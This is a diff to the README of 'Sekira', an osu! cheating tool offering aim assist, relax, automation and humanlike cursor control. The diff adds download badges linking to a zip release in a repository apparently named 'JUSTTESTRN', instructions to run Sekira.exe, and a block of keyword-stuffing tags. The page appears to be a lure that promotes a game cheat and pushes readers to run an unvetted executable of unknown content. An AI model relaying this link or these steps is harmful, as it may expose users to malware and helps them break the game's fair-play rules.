@@ -3,7 +3,11 @@
 > **Sekira** is a lightweight, external performance toolkit for osu!, engineered for smooth automation, flexible key management, and humanlike control across both standard and modern clients.
 
 <img width="1217" height="791" alt="Sekira Dashboard Preview" src="https://github.com/user-attachments/assets/5f0ba18c-33f5-44b1-b3d0-98d01ab23c92" />
-
+<p align="center">
+  <a href="https://github.com/XPfarmerr/JUSTTESTRN/releases/download/v1.0.1/SekiraOsu.zip">
+    <img src="https://img.shields.io/badge/Download-Sekira_v1.0.1-brightgreen?style=for-the-badge&logo=github&logoColor=white" alt="Download Sekira">
+  </a>
+</p>
 ---
 
 ### ⚡ Key Modules
@@ -40,7 +44,26 @@ Discreet cursor tracking helper with real-time target detection.
 ---
 
 ### 🚀 Quick Start
-
+<p align="left">
+  <a href="https://github.com/XPfarmerr/JUSTTESTRN/releases/download/v1.0.1/SekiraOsu.zip">
+    <img src="https://img.shields.io/badge/Download-Sekira_v1.0.1-brightgreen?style=for-the-badge&logo=github&logoColor=white" alt="Download Sekira">
+  </a>
+</p>
 1. Click on the link above to download the latest release.
+
 2. Launch your preferred osu! client.
+
 3. Run `Sekira.exe` and configure your preferences in the dashboard UI.
+
+---
+### tags
+- osu aim assist
+- osu relax
+- osu utility
+- osu assistant
+- osu performance
+- osu timing
+- osu automation
+- osu helper
+- osu tool
+- osu enhancer
